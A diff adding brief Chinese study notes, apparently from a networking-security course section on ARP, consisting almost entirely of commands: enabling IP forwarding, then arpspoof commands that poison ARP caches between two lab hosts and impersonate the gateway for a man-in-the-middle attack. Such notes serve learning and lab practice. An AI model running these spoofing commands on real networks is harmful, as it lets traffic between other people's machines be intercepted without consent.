@@ -1,0 +1,20 @@
+7.3.1 ARP基础
+      arp
+      
+7.3.2 IP转发
+      echo 1 > /proc/sys/net/ipv4/ip_forward
+      
+      arp -a
+      
+7.3.3 ARP缓存攻击与arpspoof
+      arpspoof -i eth0 -t 192.168.31.20 192.168.31.10
+           20是本机 10是需要冒充的机器
+      arpspoof -i eth0 -t 192.168.31.10 192.168.31.20
+           相对另一台进行
+           
+       
+7.3.4 冒充网关
+      arpspoof -i eth0 -t 192.168.31.20 192.168.31.1
+      arpspoof -i eth0 -t 192.168.31.1 192.168.31.20
+      
+      
